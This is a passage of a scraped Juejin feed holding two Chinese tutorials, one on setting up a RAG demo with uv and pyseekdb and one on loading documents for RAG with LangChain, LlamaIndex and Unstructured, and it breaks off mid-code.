<p>从简单开始，从复制开始，慢慢学习复杂一点的SKILL，开发openclaw的功能！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uv × pyseekdb：把 RAG 环境与检索落地成本降到最低]]></title>    <link>https://juejin.cn/post/7605625595570421775</link>    <guid>https://juejin.cn/post/7605625595570421775</guid>    <pubDate>2026-02-13T02:03:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605625595570421775" data-draft-id="7605542907118698548" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uv × pyseekdb：把 RAG 环境与检索落地成本降到最低"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-13T02:03:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="老纪的技术唠嗑局"/> <meta itemprop="url" content="https://juejin.cn/user/2394058441104739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uv × pyseekdb：把 RAG 环境与检索落地成本降到最低
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2394058441104739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    老纪的技术唠嗑局
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:03:06.000Z" title="Fri Feb 13 2026 02:03:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">01 AI 开发者的基建</h2>
<p>过去很多团队把主要精力放在算法本身；在大模型生态成熟后，工程侧更常见的阻塞变成两类：一是环境与依赖的可复现，二是数据导入、检索与存储的落地成本。AI 项目往往带着较重的依赖组合（如 PyTorch、Transformers、各类 RAG 框架），如果每次协作、换机器、进 CI 都要重新处理 Python 版本、虚拟环境、锁文件与依赖冲突，成本会被放大。</p>
<p>这篇文章介绍两个工具，目标是把环境成本和检索数据落地成本更低：</p>
<ul>
<li><code>uv</code>：由 Astral 团队推出的 Rust 编写的 Python 包管理器，以速度与一致性优化 Python 工作流。</li>
<li><code>pyseekdb</code>：面向 seekdb 与 OceanBase AI search 的 Python SDK，支持嵌入式与远程两种部署方式，并覆盖向量、全文与混合检索能力。</li>
</ul>
<h2 data-id="heading-1">02 什么是 uv</h2>
<p>在 Python 生态里，装包本身并不难，难在团队协作下的一致性：不同人用不同工具（<code>pip+venv</code>/<code>poetry</code>），再叠加不同 OS、代理、CPU 架构，常见结果是代码没问题，但别人跑不起来。</p>
<p>uv 的项目模式围绕 <code>pyproject.toml</code> 管依赖、用 <code>uv.lock</code> 锁定解析结果，并通过 <code>uv sync</code>/<code>uv run</code>让环境与锁文件保持一致。它的定位很明确：<strong>用一个命令行把项目、依赖、锁版本、环境同步与运行命令这一整套工作流连起来，并强调性能与工程化一致性。</strong></p>
<h2 data-id="heading-2">03 pyseekdb 简介</h2>
<p>RAG 场景里，开发者通常需要把文本切分、向量化、入库、检索、过滤、排序这一套链路跑通。pyseekdb 提供的是偏应用侧的 SDK：以 collection 为中心组织数据与检索逻辑，覆盖向量、全文与混合检索，并同时支持嵌入式与远程模式。</p>
<h3 data-id="heading-3">3.1 两种连接形态</h3>
<p>pyseekdb 支持：</p>
<ul>
<li>嵌入式：在 Python 进程内使用本地路径持久化数据，适合本地实验、测试或轻量应用。</li>
<li>远程：连接到远程 seekdb 服务或 OceanBase 集群。</li>
</ul>
<h3 data-id="heading-4">3.2 混合检索（Hybrid Search）</h3>
<p>在 pyseekdb 中，可以通过 query 调用执行向量检索或混合检索（由后端能力与配置决定），返回包含相似度与文档片段的结果集。与直接操控底层索引相比，这种方式更适合应用侧快速落地。</p>
<h3 data-id="heading-5">04 为什么 pyseekdb 需要 uv</h3>
<p>pyseekdb 本身不一定重，但它经常会和 LangChain、LlamaIndex、Dify 等组合使用。一旦依赖开始变重，环境初始化与复现就更容易拖慢协作效率。
<code>uv</code> 在这里的价值主要是两点：</p>
<ul>
<li>用 <code>uv.lock</code> 明确锁定解析结果，并用 <code>uv sync</code> / <code>uv run</code> 把安装/同步/运行收敛到更少的步骤。</li>
<li>在共享 demo 时，用 <code>uv sync</code> 或 <code>uv run</code> 尽量复现同一套环境。</li>
</ul>
<p><strong>pyseekdb 的嵌入式特性配合 uv 的轻量环境，让开发者在普通笔记本上就能完成从数据导入、索引构建到 RAG 问答的全流程开发。</strong></p>
<h3 data-id="heading-6">05 手把手教你轻松构建</h3>
<p>下面用 pyseekdb GitHub 官方 demo/rag 跑通一条完整链路，目标是让你在 5 分钟内从“环境准备”到“可查询的知识库界面”。</p>
<p><strong>前置条件</strong>：</p>
<ul>
<li>Python 3.11+</li>
<li>已安装 uv</li>
<li>已准备 LLM API Key（用于生成回答）</li>
<li>pyseekdb</li>
</ul>
<p><strong>步骤 1：准备环境</strong></p>
<pre><code class="hljs language-plain" lang="plain">git clone https://github.com/oceanbase/pyseekdb.git
cd demo/rag
uv sync
</code></pre>
<p>如果需要本地模型（<code>sentence-transformers</code>）</p>
<pre><code class="hljs language-plain" lang="plain">uv sync --extra local
</code></pre>
<p><strong>步骤 2：配置 .env</strong></p>
<pre><code class="hljs language-plain" lang="plain">cp .env.example .env
</code></pre>
<p>推荐先用默认 embedding（无需额外 API Key）：</p>
<pre><code class="hljs language-plain" lang="plain">EMBEDDING_FUNCTION_TYPE=default
OPENAI_API_KEY=sk-your-key
OPENAI_BASE_URL=https://dashscope.aliyuncs.com/compatible-mode/v1
OPENAI_MODEL_NAME=qwen-plus
SEEKDB_DIR=./data/seekdb_rag
SEEKDB_NAME=test
COLLECTION_NAME=embeddings
</code></pre>
<p><strong>说明</strong>：</p>
<ul>
<li>default 会自动下载内置 ONNX 模型，适合先验证流程。</li>
<li>若改为 api，请补齐<code>EMBEDDING_*</code>相关配置。</li>
<li>若改为 local，请配置<code>SENTENCE_TRANSFORMERS_*</code>并确保已安装<code>--extra local</code>依赖。</li>
</ul>
<p><strong>步骤 3：导入数据</strong></p>
<pre><code class="hljs language-plain" lang="plain">uv run python seekdb_insert.py ../../README.md
</code></pre>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2026/png/32756313/1770947523807-728fd488-e2eb-4540-b9bc-ce31d18e79ca.png" alt="" loading="lazy"/></p>
<p>也可以导入目录：</p>
<pre><code class="hljs language-plain" lang="plain">uv run python seekdb_insert.py path/to/your_dir
</code></pre>
<p>你会看到脚本输出导入的分块数量与进度，成功后数据会落在<code>SEEKDB_DIR</code>指定目录中。</p>
<p><strong>步骤 4：启动界面</strong></p>
<pre><code class="hljs language-plain" lang="plain">uv run streamlit run seekdb_app.py
</code></pre>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2026/png/32756313/1770947523875-440befd2-c821-4b54-9790-c91d30f577f5.png" alt="" loading="lazy"/></p>
<p>启动后打开浏览器，在输入框里提问即可看到：</p>
<ul>
<li>检索到的相关片段</li>
<li>LLM 的生成回答（依赖你在<code>.env</code>里配置的 LLM）</li>
</ul>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2026/png/32756313/1770947523869-981b2e84-adab-4da0-b55d-6931acd31622.png" alt="" loading="lazy"/></p>
<p><strong>效果：</strong></p>
<ul>
<li>文档被切分、向量化并写入 seekdb</li>
<li>查询时执行向量/混合检索</li>
<li>UI 中展示检索结果与 LLM 生成答案</li>
</ul>
<h2 data-id="heading-7">06 回归开发的本质</h2>
<p>uv 解决的是项目环境可复现与流程收敛，pyseekdb 解决的是RAG 场景下的存储与检索落地成本和易用性。把两者放在一起，是把 demo 交付与协作时的摩擦做小：项目结构、依赖、运行方式更统一；本地 embedded 能快速开始，之后再按需要切到远程服务。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RAG的基石-数据加载]]></title>    <link>https://juejin.cn/post/7605811866908246025</link>    <guid>https://juejin.cn/post/7605811866908246025</guid>    <pubDate>2026-02-13T01:07:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605811866908246025" data-draft-id="7605711582430674995" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RAG的基石-数据加载"/> <meta itemprop="keywords" content="AIGC,LangChain"/> <meta itemprop="datePublished" content="2026-02-13T01:07:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="架架架构师"/> <meta itemprop="url" content="https://juejin.cn/user/860253654882618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RAG的基石-数据加载
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/860253654882618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    架架架构师
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T01:07:00.000Z" title="Fri Feb 13 2026 01:07:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">RAG</h2>
<p>RAG 是 <strong>Retrieval-Augmented Generation（检索增强生成）</strong> 的缩写，是一种结合「外部知识检索」和「大语言模型生成」的技术方案。通俗的来说是通过大模型来回答问题的时候，去检索外部知识库的相关信息，在基于这些信息生成内容。</p>
<p>可能有的亦菲、彦祖们要问了，为啥需要检索外部的知识库，我直接问大模型不行吗。如果是问一些基本知识，是可以的。但是想要问一些最新资料，或者是私有资料的内容，是不行的！因为大模型的知识是“固化”在训练数据里的，无法实时更新，更不了解私有资料的内容。所以通过RAG检索到资料的数据，将数据传递给大模型，让其基于这些数据生成你想要的回答。</p>
<h2 data-id="heading-1">应用背景</h2>
<p>那么RAG技术可以干什么？可以搭建以下系统：</p>
<ul>
<li>企业内部知识库：将企业文档存入RAG知识库，系统回答对应的文档内容，避免人工大量的翻阅文档</li>
<li>智能客服：将最新的业务规则和产品手册存入RAG知识库，系统回答客户产品相关问题</li>
<li>金融/医疗等合规性行业：将合规文档和行业指南存入RAG数据库，让系统给出建议和总结</li>
</ul>
<h2 data-id="heading-2">技术实现</h2>
<h3 data-id="heading-3">数据加载</h3>
<p>做RAG系统的第一步就是数据的导入，接下来简单列下数据加载的各种技术，供各位亦菲、彦祖们参考</p>
<h4 data-id="heading-4">所用技术</h4>
<h5 data-id="heading-5">Langchain</h5>
<p>LangChain 是什么，是一个专为<strong>构建大语言模型（LLM）驱动的应用程序设计的开源框架</strong>。主要是让开发者能快速的构建出复杂的LLM应用，比如我们文中所提到的RAG系统。框架提供了以下的核心功能，用来构建复杂的LLM应用。</p>
<ul>
<li>工具集成：连接各种API和外部工具</li>
<li>记忆：管理对话历史</li>
<li>链式调用：将多个LLM调用和工具结合起来</li>
<li>代理：让LLM自主决策和使用工具</li>
</ul>
<p>官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2F" target="_blank" title="https://docs.langchain.com/" ref="nofollow noopener noreferrer">docs.langchain.com/</a></p>
<h5 data-id="heading-6">LIamaIndex</h5>
<p>LIamaIndex 是一套 <strong>专注于「文档理解与知识库问答」的开源框架</strong>，尤其适用于RAG系统，擅长文档处理、检索优化。官方网站: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.llamaindex.ai%2F" target="_blank" title="https://www.llamaindex.ai/" ref="nofollow noopener noreferrer">www.llamaindex.ai/</a></p>
<h5 data-id="heading-7">Unstructured</h5>
<p>Unstructured 是一款专注于<strong>非结构化文档数据处理的开源工具库</strong>，核心能力将复杂的文档（PDF、Word、网页）和非结构化文档转换成规整，可直接供给大模型或RAG使用的结构化数据。官方文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.unstructured.io%2F" target="_blank" title="https://docs.unstructured.io/" ref="nofollow noopener noreferrer">docs.unstructured.io/</a></p>
<p>看到这儿，有的小伙伴可能会问，为啥我会选择 Python的技术框架，而不用Java的 <strong>Langchain4j</strong>。因为在 Python 生态下构建 LLM/RAG 应用，LangChain 远比 langchain4j 更丰富、更好用！</p>
<h4 data-id="heading-8">环境准备</h4>
<ol>
<li>下载安装 <strong>Miniconda</strong>, Miniconda是一个轻量级的 Python 环境管理工具，仅包含 conda 包管理器和 Python 核心，可便捷创建、管理独立的 Python 环境。国内镜像地址: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmirrors.tuna.tsinghua.edu.cn%2Fanaconda%2Fminiconda%2F" target="_blank" title="https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/" ref="nofollow noopener noreferrer">mirrors.tuna.tsinghua.edu.cn/anaconda/mi…</a></li>
<li>创建一个requeriment.txt文件，管理各种依赖:</li>
</ol>

<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">核心LLM框架依赖</span>
<span class="hljs-meta prompt_">llama-index&gt;</span><span class="bash">=0.10.0</span>
<span class="hljs-meta prompt_">python-dotenv&gt;</span><span class="bash">=1.0.0</span>
<span class="hljs-meta prompt_">openai&gt;</span><span class="bash">=1.0.0</span>
<span class="hljs-meta prompt_">langchain&gt;</span><span class="bash">=0.1.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">关键升级：langchain-community 需 &gt;= 0.2.0 才支持 headers 参数</span>
<span class="hljs-meta prompt_">langchain-community&gt;</span><span class="bash">=0.2.0</span>
<span class="hljs-meta prompt_">langchain-openai&gt;</span><span class="bash">=0.1.0</span>
<span class="hljs-meta prompt_">langchain-text-splitters&gt;</span><span class="bash">=0.0.1</span>
<span class="hljs-meta prompt_">langchain-core&gt;</span><span class="bash">=0.1.0</span>
<span class="hljs-meta prompt_">langchain-huggingface&gt;</span><span class="bash">=0.0.3</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">文本处理/嵌入依赖</span>
<span class="hljs-meta prompt_">sentence-transformers&gt;</span><span class="bash">=2.2.0</span>
<span class="hljs-meta prompt_">markdown&gt;</span><span class="bash">=3.4.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">文档解析依赖</span>
<span class="hljs-meta prompt_">unstructured&gt;</span><span class="bash">=0.10.30</span>
<span class="hljs-meta prompt_">unstructured[pdf]&gt;</span><span class="bash">=0.10.30</span>
<span class="hljs-meta prompt_">unstructured[ppt]&gt;</span><span class="bash">=0.10.30</span>
<span class="hljs-meta prompt_">langchain-unstructured&gt;</span><span class="bash">=0.1.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">Windows 系统依赖（解决文件解析/路径问题）</span>
<span class="hljs-meta prompt_">pywin32&gt;</span><span class="bash">=306</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">Unstructured 解析 markdown 必需的依赖</span>
<span class="hljs-meta prompt_">markdown-it-py&gt;</span><span class="bash">=3.0.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">PDF/OCR相关依赖</span>
<span class="hljs-meta prompt_">pdf2image&gt;</span><span class="bash">=1.16.0</span>
<span class="hljs-meta prompt_">pytesseract&gt;</span><span class="bash">=0.3.10</span>
​
​
<span class="hljs-meta prompt_"># </span><span class="bash">图片识别核心依赖（PaddleOCR 方案）</span>
<span class="hljs-meta prompt_">paddlepaddle&gt;</span><span class="bash">=2.6.0</span>
<span class="hljs-meta prompt_">paddleocr&gt;</span><span class="bash">=2.7.0</span>
<span class="hljs-meta prompt_">pillow&gt;</span><span class="bash">=10.0.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">llama-index 核心依赖（数据库读取功能）</span>
<span class="hljs-meta prompt_">llama-index-readers-database&gt;</span><span class="bash">=0.1.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">MySQL 数据库驱动（必须）</span>
<span class="hljs-meta prompt_">mysql-connector-python&gt;</span><span class="bash">=8.0.0</span>
<span class="hljs-meta prompt_"># </span><span class="bash">或备选驱动（二选一，推荐上面的）</span>
<span class="hljs-meta prompt_"># </span><span class="bash">pymysql&gt;=1.1.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">新增：SQLAlchemy 适配 MySQL 的依赖</span>
<span class="hljs-meta prompt_">sqlalchemy&gt;</span><span class="bash">=2.0.0</span>
​
​
<span class="hljs-meta prompt_"># </span><span class="bash">核心依赖</span>
<span class="hljs-meta prompt_">fastapi&gt;</span><span class="bash">=0.115.0</span>
<span class="hljs-meta prompt_">uvicorn[standard]&gt;</span><span class="bash">=0.32.0</span>
<span class="hljs-meta prompt_">pydantic&gt;</span><span class="bash">=2.0.0</span>
<span class="hljs-meta prompt_">pydantic-settings&gt;</span><span class="bash">=2.0.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">扩展依赖（你的场景需要）</span>
<span class="hljs-meta prompt_">python-multipart&gt;</span><span class="bash">=0.0.17  <span class="hljs-comment"># 文件上传</span></span>
<span class="hljs-meta prompt_">python-dotenv&gt;</span><span class="bash">=1.0.0  <span class="hljs-comment"># 读取.env文件</span></span>
<span class="hljs-meta prompt_">requests&gt;</span><span class="bash">=2.32.0  <span class="hljs-comment"># 调用AI接口</span></span>
​
<span class="hljs-meta prompt_">#</span><span class="bash">数据分析</span>
<span class="hljs-meta prompt_">pandas&gt;</span><span class="bash">=2.2.2</span>
</code></pre>
<h4 data-id="heading-9">实现</h4>
<h5 data-id="heading-10">文本</h5>
<p>Unstructured 加载 txt、md格式数据，代码如下：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> unstructured.partition.text <span class="hljs-keyword">import</span> partition_text
<span class="hljs-keyword">from</span> unstructured.partition.md <span class="hljs-keyword">import</span> partition_md
​
text_file = <span class="hljs-string">"../../document/企业概况与分析框架.txt"</span>
md_file = <span class="hljs-string">"../../document/企业财务报表分析.md"</span>
​
​
